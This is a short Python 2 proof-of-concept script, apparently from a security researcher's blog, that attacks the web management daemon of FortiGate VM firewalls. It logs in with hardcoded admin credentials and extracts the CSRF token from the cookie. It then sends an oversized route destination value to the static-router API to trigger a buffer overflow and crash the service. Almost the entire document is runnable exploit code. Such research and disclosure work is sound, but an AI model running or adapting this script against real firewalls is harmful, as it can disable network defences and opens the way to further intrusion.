#!/usr/bin/env python
# forteanet.py - quick poc for fortigate vm httpsd overflow
# found: 23:20 @ 09.09.2019
# skeleton : 03:18 @ 10.09.2019
# code610 blogspot com
#

import sys, re, requests, json

# presets
target = 'http://' + sys.argv[1]
user = 'admin'
passwd = 'P@ssw0rd'

# hello world
print '[+] checking FG VM appliance : %s' % ( target )

# log in to get session
session = requests.session()
initlink = target + '/ng/'

initreq = session.get(initlink, verify=False, allow_redirects=True)
initresp = initreq.text
initcode = initreq.status_code

if initcode == 200:
  print '[+] found login page, trying (%s:%s)' % ( user, passwd )

  loglink = target + '/logincheck'
  logdata = {
    'ajax':1,
    'username':user,
    'secretkey':passwd,
    'redir':'%2Fng'
  }
  log = session.post(loglink, data=logdata, allow_redirects=True)
  logresp = log.text
  logheads = log.headers

  headers = logheads['set-cookie']
  find_token = re.compile('ccsrftoken="(.*?)"')
  found_token = re.search(find_token, headers)

  if found_token:
    token = found_token.group(1)
    print '[+] found token: %s' % ( token )

    lastpost = target + '/api/v2/cmdb/router/static?datasource=1&with_meta=1'
    siemka = 'A'* 216 + 'B'*6 + 'CC'

    headers2 = {'X-CSRFTOKEN':token, 'Content-type':'application/json'}
    #print headers2

    postdata = [{"dst":siemka,"device":{"name":"port10","real_interface_name":"port10","vdom":"root","is_system_interface":"true","status":"up","in_bandwidth_limit":0,"out_bandwidth_limit":0,"dynamic_addressing":"false","dhcp4_client_count":0,"dhcp6_client_count":0,"role":"undefined","mac_address":"00:0c:29:22:65:1a","link":"up","duplex":"half","supports_device_id":"true","valid_in_policy":"true","supports_fortitelemetry":"true","fortitelemetry":"false","is_used":"false","is_physical":"true","media":"rj45","is_aggregatable":"true","is_explicit_proxyable":"true","is_ipsecable":"true","is_routable":"true","tagging":[],"type":"physical","icon":"ftnt-interface-rj45-up","q_origin_key":"port10","interface-name":"port10","datasource":"system.interface","label":"port10","sortValue":0}}]

    try:
      dopost = session.post(lastpost, data=json.dumps(postdata), headers=headers2, allow_redirects=True)
      print dopost.text

    except requests.exceptions.ConnectionError, e:
      print '[!] Connection reset; check log->events now.'

# cheers
# o/

